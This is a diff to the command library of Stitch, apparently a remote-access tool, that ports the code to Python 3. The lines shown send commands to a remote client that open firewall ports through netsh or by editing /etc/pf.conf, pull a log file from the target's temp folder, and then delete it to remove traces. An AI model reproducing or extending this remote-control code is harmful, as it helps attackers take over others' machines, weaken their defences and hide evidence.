@@ -2,6 +2,7 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+import configparser
 from .stitch_help import *
 from .stitch_utils import *
 
@@ -47,8 +48,8 @@ def st_send(client, data, aes_enc):
     client.sendall(eof)
 
 class stitch_commands_library:
-    __slots__= ['client', 'cli_target', 'cli_port', 'cli_os','cli_platform',
-                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp',]
+    __slots__= ['client', 'cli_target', 'cli_port', 'aes_key', 'cli_os','cli_platform',
+                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp', 'cli_hosts_file']
 
     def __init__(self, client, target, port, aes_key, os, platform, hostname, user, dwld, temp):
         self.client = client
@@ -62,12 +63,12 @@ class stitch_commands_library:
         self.cli_dwld = dwld
         self.cli_temp = temp
         if self.cli_os.startswith('win'):
-            self.cli_hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
+            self.cli_hosts_file = r'C:\Windows\System32\drivers\etc\hosts'
         else:
             self.cli_hosts_file = '/etc/hosts'
 
     def history_check(self):
-        self.Config = ConfigParser.ConfigParser()
+        self.Config = configparser.ConfigParser()
         self.Config.read(hist_ini)
         self.cfgfile = open(hist_ini,'w')
         if self.cli_target not in self.Config.sections():
@@ -272,7 +273,7 @@ class stitch_commands_library:
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
             if osx_client(self.cli_os):
-                cmd = "sed -i '' -e '$a\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(proto,port)
+                cmd = "sed -i '' -e '$a\\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(proto,port)
             self.send(cmd)
             st_print(self.receive())
         elif option == 'close':
@@ -659,8 +660,8 @@ class stitch_commands_library:
             resp = self.receive()
             if no_error(resp):
                 if windows_client(self.cli_os):
-                    self.download('C:\\Windows\\Temp\\c_log_626')
-                    self.send('del C:\\Windows\\Temp\\c_log_626')
+                    self.download(r'C:\Windows\Temp\c_log_626')
+                    self.send(r'del C:\Windows\Temp\c_log_626')
                 else:
                     self.download('/tmp/c_log_626')
                     self.send('rm -f /tmp/c_log_626')
